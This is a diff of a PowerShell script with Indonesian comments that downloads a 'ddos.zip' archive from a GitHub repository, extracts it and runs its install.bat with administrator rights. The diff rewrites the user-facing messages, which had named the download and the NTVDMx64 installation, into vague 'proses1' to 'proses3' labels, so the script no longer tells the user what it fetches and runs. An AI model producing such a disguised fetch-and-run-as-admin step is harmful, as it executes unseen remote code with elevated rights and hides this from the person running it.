@@ -32,7 +32,7 @@ if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
 New-Item -Path $TempDir -ItemType Directory -Force | Out-Null
 
 # Unduh file ZIP
-Write-Host "Mengunduh ddos.zip..." -ForegroundColor Green
+Write-Host "proses1..." -ForegroundColor Green
 $URL = "https://github.com/cvs5758/ddos/raw/main/ddos.zip "
 
 try {
@@ -52,7 +52,7 @@ if (-not (Test-Path $ZipFile)) {
 New-Item -Path $ExtractDir -ItemType Directory -Force | Out-Null
 
 # Ekstrak dengan 7-Zip
-Write-Host "Mengekstrak ddos.zip dengan 7-Zip..." -ForegroundColor Green
+Write-Host "proses2..." -ForegroundColor Green
 $extractProcess = Start-Process -FilePath "7z.exe" -ArgumentList "x `"$ZipFile`" -o`"$ExtractDir`" -y" -Wait -NoNewWindow -PassThru
 
 if ($extractProcess.ExitCode -ne 0) {
@@ -62,12 +62,12 @@ if ($extractProcess.ExitCode -ne 0) {
 
 # Verifikasi apakah install.bat ada
 if (-not (Test-Path $InstallBat)) {
-    Write-Host "File install.bat tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
+    Write-Host "File proses tidak ditemukan setelah ekstraksi!" -ForegroundColor Red
     exit
 }
 
 # Jalankan install.bat sebagai admin
-Write-Host "Menjalankan instalasi NTVDMx64..." -ForegroundColor Green
+Write-Host "proses3.." -ForegroundColor Green
 Start-Process powershell -ArgumentList "-Command `"$InstallBat`"" -Verb RunAs -Wait
 
 # Hapus folder sementara
